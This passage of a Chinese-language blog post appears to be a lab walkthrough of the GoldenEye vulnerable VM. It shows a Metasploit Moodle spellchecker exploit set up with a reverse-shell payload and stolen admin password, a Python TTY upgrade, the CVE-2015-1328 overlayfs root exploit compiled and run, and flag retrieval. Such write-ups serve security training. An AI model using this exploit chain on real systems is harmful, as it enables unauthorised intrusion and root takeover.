10.0.0.3（需要本地IP）</span><br><span class="line">run  ----执行命令</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use 0</span><br><span class="line">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/moodle_spelling_binary_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD                    <span class="built_in">yes</span>       Password to authenticate with</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      <span class="built_in">yes</span>       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using</span><br><span class="line">                                         -Metasploit</span><br><span class="line">   RPORT      80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SESSKEY                     no        The session key of the user to impersonate</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /moodle/         <span class="built_in">yes</span>       The URI of the Moodle installation</span><br><span class="line">   USERNAME   admin            <span class="built_in">yes</span>       Username to authenticate with</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; <span class="built_in">set</span> password xWinter1995x!</span><br><span class="line">password =&gt; xWinter1995x!</span><br><span class="line">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; <span class="built_in">set</span> rhost severnaya-station.com</span><br><span class="line">rhost =&gt; severnaya-station.com</span><br><span class="line">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; <span class="built_in">set</span> targeturi /gnocertdir</span><br><span class="line">targeturi =&gt; /gnocertdir</span><br><span class="line">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; <span class="built_in">set</span> payload cmd/unix/reverse</span><br><span class="line">payload =&gt; cmd/unix/reverse</span><br><span class="line">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; <span class="built_in">set</span> lhost 10.0.0.3</span><br><span class="line">lhost =&gt; 10.0.0.3</span><br><span class="line">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 10.0.0.3:4444</span><br><span class="line">[*] Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to <span class="built_in">disable</span>)</span><br><span class="line">[+] The target appears to be vulnerable. Exploitable Moodle version 2.2 detected</span><br><span class="line">[*] Authenticating as user: admin</span><br><span class="line">[*] Getting session key to update spellchecker <span class="keyword">if</span> no session key was specified</span><br><span class="line">[*] Updating spellchecker to use the system aspell</span><br><span class="line">[*] Triggering payload</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure><p>发现没有运行成功</p><p>查看exp需要pspellshell</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661483641-84ce090de92d71a51f3a911c8db06d78.webp" alt="image-20220826111358749"></p><p>使用admin登录<a target="_blank" rel="noopener external nofollow noreferrer" href="http://severnaya-station.com/gnocertdir">http://severnaya-station.com/gnocertdir</a></p><p>在settings-&gt;Site administration-&gt;Plugins-&gt;Text editors-&gt;YinyMCE HTML editor处</p><p>修改speel engine 为pspellshell</p><p>然后保存 msf执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 10.0.0.3:4444</span><br><span class="line">[*] Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to <span class="built_in">disable</span>)</span><br><span class="line">[+] The target appears to be vulnerable. Exploitable Moodle version 2.2 detected</span><br><span class="line">[*] Authenticating as user: admin</span><br><span class="line">[*] Getting session key to update spellchecker <span class="keyword">if</span> no session key was specified</span><br><span class="line">[*] Updating spellchecker to use the system aspell</span><br><span class="line">[*] Triggering payload</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: <span class="built_in">echo</span> 7YPpFMOnfF8gG8B3;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket A</span><br><span class="line">[*] A: <span class="string">&quot;7YPpFMOnfF8gG8B3\r\n&quot;</span></span><br><span class="line">[*] Matching...</span><br><span class="line">[*] B is input...</span><br><span class="line"><span class="built_in">whoami</span>[*] Command shell session 2 opened (10.0.0.3:4444 -&gt; 10.0.0.101:47575) at 2022-08-26 11:16:45 +0800</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www-data</span><br></pre></td></tr></table></figure><p>然后执行tty 因为获得的权限无框架：执行</p><p>查看有没有安装python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whereis python</span><br><span class="line">python: /usr/bin/python3.4m /usr/bin/python /usr/bin/python3.4 /usr/bin/python2.7 /etc/python /etc/python3.4 /etc/python2.7 /usr/lib/python3.4 /usr/lib/python2.7 /usr/bin/X11/python3.4m /usr/bin/X11/python /usr/bin/X11/python3.4 /usr/bin/X11/python2.7 /usr/local/lib/python3.4 /usr/local/lib/python2.7 /usr/share/python /usr/share/man/man1/python.1.gz</span><br></pre></td></tr></table></figure><p>使用python 获得tty shell</p><p><code>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code></p><p>查看内核版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ <span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">www-data@01:/tmp$ <span class="built_in">uname</span> -a</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">Linux 01 3.13.0-32-generic <span class="comment">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">www-data@01:/tmp$</span><br></pre></td></tr></table></figure><h2 id="提权">提权</h2><p>已知内核版本为3.13.0</p><p>搜索3.13.0 提权</p><p>在exploit-db找到 cve 2015-1328</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span><br><span class="line">CVE-2015-1328 / ofs.c</span><br><span class="line">overlayfs incorrect permission handling + FS_USERNS_MOUNT</span><br><span class="line"></span><br><span class="line">user@ubuntu-server-1504:~$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux ubuntu-server-1504 3.19.0-18-generic <span class="comment">#18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">user@ubuntu-server-1504:~$ gcc ofs.c -o ofs</span><br><span class="line">user@ubuntu-server-1504:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(user) gid=1000(user) <span class="built_in">groups</span>=1000(user),24(cdrom),30(dip),46(plugdev)</span><br><span class="line">user@ubuntu-server-1504:~$ ./ofs</span><br><span class="line">spawning threads</span><br><span class="line">mount <span class="comment">#1</span></span><br><span class="line">mount <span class="comment">#2</span></span><br><span class="line">child threads <span class="keyword">done</span></span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),24(cdrom),30(dip),46(plugdev),1000(user)</span><br><span class="line"></span><br><span class="line">greets to beist &amp; kaliman</span><br><span class="line">2015-05-24</span><br></pre></td></tr></table></figure><p>查看代码 需要使用gcc编译</p><p>查看有没有gcc环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@01:/tmp$ gcc</span><br><span class="line">gcc</span><br><span class="line">The program <span class="string">&#x27;gcc&#x27;</span> is currently not installed. To run <span class="string">&#x27;gcc&#x27;</span> please ask your administrator to install the package <span class="string">&#x27;gcc&#x27;</span></span><br></pre></td></tr></table></figure><p>没有 查看有没有cc环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@01:/tmp$ cc</span><br><span class="line">cc</span><br><span class="line">clang: error: no input files</span><br><span class="line">www-data@01:/tmp$</span><br></pre></td></tr></table></figure><p>报错显示没有输入文件,所以有</p><p>修改exp,gcc修改为cc</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661486633-8f78136f580c7fda09faf40657a2e72c.webp" alt="image-20220826120348707"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">www-data@01:/tmp$ cc 1.c -o exp</span><br><span class="line">cc 1.c -o exp</span><br><span class="line">1.c:62:1: warning: control may reach end of non-void <span class="keyword">function</span> [-Wreturn-<span class="built_in">type</span>]</span><br><span class="line">&#125;</span><br><span class="line">^</span><br><span class="line">1.c:74:12: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;unshare&#x27;</span> is invalid <span class="keyword">in</span> C99 [-Wimplicit-function-declaration]</span><br><span class="line">        <span class="keyword">if</span>(unshare(CLONE_NEWUSER) != 0)</span><br><span class="line">           ^</span><br><span class="line">1.c:79:17: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;clone&#x27;</span> is invalid <span class="keyword">in</span> C99 [-Wimplicit-function-declaration]</span><br><span class="line">                <span class="built_in">clone</span>(child_exec, child_stack + (1024*1024), clone_flags, NULL);</span><br><span class="line">                ^</span><br><span class="line">1.c:85:13: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;waitpid&#x27;</span> is invalid <span class="keyword">in</span> C99 [-Wimplicit-function-declaration]</span><br><span class="line">            waitpid(pid, &amp;status, 0);</span><br><span class="line">            ^</span><br><span class="line">1.c:95:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;wait&#x27;</span> is invalid <span class="keyword">in</span> C99 [-Wimplicit-function-declaration]</span><br><span class="line">    <span class="built_in">wait</span>(NULL);</span><br><span class="line">    ^</span><br><span class="line">5 warnings generated.</span><br><span class="line">www-data@01:/tmp$ ./exp</span><br><span class="line">./exp</span><br><span class="line">spawning threads</span><br><span class="line">mount <span class="comment">#1</span></span><br><span class="line">mount <span class="comment">#2</span></span><br><span class="line">child threads <span class="keyword">done</span></span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),33(www-data)</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>提权成功</p><p>接着查找flag了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># find / -name &quot;*flag*&quot;</span></span><br><span class="line">find / -name <span class="string">&quot;*flag*&quot;</span></span><br><span class="line">/usr/lib/llvm-3.4/build/autoconf/m4/cxx_flag_check.m4</span><br><span class="line">/usr/lib/perl/5.18.2/bits/waitflags.ph</span><br><span class="line">/usr/share/help-langpack/en_GB/evolution/mail-follow-up-flag.page</span><br><span class="line">/usr/share/help-langpack/en_GB/gnome-mines/flags.page</span><br><span class="line">/usr/share/man/man3/fesetexceptflag.3.gz</span><br><span class="line">/usr/share/man/man3/fegetexceptflag.3.gz</span><br><span class="line">/usr/share/man/man1/doveadm-flags.1.gz</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/scripts/coccinelle/locks/flags.cocci</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/c6x/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/frv/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/parisc/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/score/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/s390/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/um/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/unicore32/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/x86/kernel/cpu/mkcapflags.sh</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/x86/include/asm/processor-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/x86/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/x86/include/uapi/asm/processor-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/mn10300/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/openrisc/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/hexagon/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/alpha/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/sh/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/metag/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/m32r/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/arm64/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/powerpc/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/arm/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/microblaze/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/xtensa/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/tile/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/sparc/include/asm/irqflags_32.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/sparc/include/asm/irqflags_64.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/sparc/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/ia64/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/arc/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/mips/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/avr32/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/cris/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/cris/include/arch-v32/arch/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/cris/include/arch-v10/arch/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/m68k/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/blackfin/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/uapi/linux/kernel-page-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/uapi/linux/tty_flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/linux/page-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/linux/pageblock-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/linux/kernel-page-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/linux/page-flags-layout.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/linux/page-debug-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/linux/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/trace/events/gfpflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/asm-generic/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/config/arch/hweight/cflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/config/pageflags</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/config/zone/dma/flag.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/config/trace/irqflags</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/linux/page-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/linux/pageblock-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/linux/kernel-page-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/linux/page-flags-layout.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/linux/page-debug-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/linux/irqflags.h</span><br><span class="line">/usr/include/x86_64-linux-gnu/asm/processor-flags.h</span><br><span class="line">/usr/include/x86_64-linux-gnu/bits/waitflags.h</span><br><span class="line">/usr/include/linux/kernel-page-flags.h</span><br><span class="line">/usr/include/linux/tty_flags.h</span><br><span class="line">/proc/kpageflags</span><br><span class="line">/proc/sys/kernel/acpi_video_flags</span><br><span class="line">/var/www/html/006-final/x8vtfinal-flag.gif</span><br><span class="line">/var/www/html/006-final/xvf7-flag</span><br><span class="line">/var/www/html/gnocertdir/pix/i/unflagged.png</span><br><span class="line">/var/www/html/gnocertdir/pix/i/flagged.png</span><br><span class="line">/var/www/html/gnocertdir/question/flags.js</span><br><span class="line">/var/www/html/gnocertdir/question/toggleflag.php</span><br><span class="line">/var/www/html/gnocertdir/theme/afterburner/pix_core/i/unflagged.png</span><br><span class="line">/var/www/html/gnocertdir/theme/afterburner/pix_core/i/flagged.png</span><br><span class="line">/var/www/html/gnocertdir/theme/mymobile/pix_core/i/unflagged.png</span><br><span class="line">/var/www/html/gnocertdir/theme/mymobile/pix_core/i/flagged.png</span><br><span class="line">/var/www/html/gnocertdir/mod/quiz/pix/navflagged.png</span><br><span class="line">/root/.flag.txt</span><br><span class="line">/sys/devices/pci0000:00/0000:00:11.0/0000:02:01.0/net/eth0/flags</span><br><span class="line">/sys/devices/system/cpu/cpu0/microcode/processor_flags</span><br><span class="line">/sys/devices/virtual/net/lo/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS0/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS1/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS2/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS3/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS4/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS5/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS6/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS7/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS8/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS9/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS10/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS11/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS12/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS13/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS14/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS15/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS16/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS17/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS18/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS19/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS20/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS21/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS22/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS23/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS24/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS25/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS26/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS27/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS28/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS29/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS30/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS31/flags</span><br><span class="line">/sys/kernel/debug/tracing/events/power/pm_qos_update_flags</span><br><span class="line">/sys/module/scsi_mod/parameters/default_dev_flags</span><br></pre></td></tr></table></figure><p>发现有个flag.txt文件</p><p>cat 这个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat .flag.txt</span></span><br><span class="line"><span class="built_in">cat</span> .flag.txt</span><br><span class="line">Alec told me to place the codes here:</span><br><span class="line"></span><br><span class="line">568628e0d993b1973adc718237da6e93</span><br><span class="line"></span><br><span class="line">If you captured this make sure to go here.....</span><br><span class="line">/006-final/xvf7-flag/</span><br></pre></td></tr></table></figure><p>访问/006-final/xvf7-flag/</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661486915-9f03895b7c8fdbdf623cb6f13c34754e.webp" alt="image-20220826120826659"></p></article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>001-Goldeneye</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://www.dansemal.cn/posts/243a10bf/">https://www.dansemal.cn/posts/243a10bf/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>Dansemal</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2022-08-14</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2022-08-14</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener external nofollow noreferrer" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener external nofollow noreferrer" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%99%BE%E9%A1%B9%E7%9B%AE/">百项目</a></div><div class="post_share"></div></div><div class="ads-wrap"><ins class="adsbygoogle" style="display:block" data-ad-format="fluid" data-ad-layout-key="-fb+5w+4e-db+86" data-ad-client="ca-pub-5809522043388135" data-ad-slot="3669687396"></ins><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/posts/e5d9e109/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661497025-eca98eaa2b32fb9dfbaef788041dcde0.webp" onerror='onerror=null,src="/image/404.webp"' alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">002-Lampiao</div></div></a></div></nav><div 